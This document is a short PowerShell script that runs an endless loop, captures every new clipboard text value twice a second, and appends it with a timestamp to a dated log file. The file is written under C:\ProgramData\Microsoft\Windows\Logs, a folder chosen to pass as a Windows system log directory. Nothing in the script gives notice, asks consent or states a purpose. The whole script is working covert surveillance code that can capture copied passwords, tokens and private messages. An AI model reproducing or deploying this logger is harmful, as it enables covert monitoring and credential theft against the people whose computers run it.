# === clipboard.ps1 ===
Add-Type -AssemblyName PresentationCore
$logDir = "C:\ProgramData\Microsoft\Windows\Logs"
$logFile = Join-Path $logDir "$(Get-Date -Format 'yyyy-MM-dd').log"

if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}

function Get-ClipboardText {
    try {
        return [Windows.Clipboard]::GetText()
    } catch {
        return $null
    }
}

$lastText = ""
while ($true) {
    Start-Sleep -Milliseconds 500
    $text = Get-ClipboardText
    if ($text -and $text -ne $lastText) {
        $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "$time | $text" | Out-File -Append -Encoding utf8 -FilePath $logFile
        $lastText = $text
    }
}
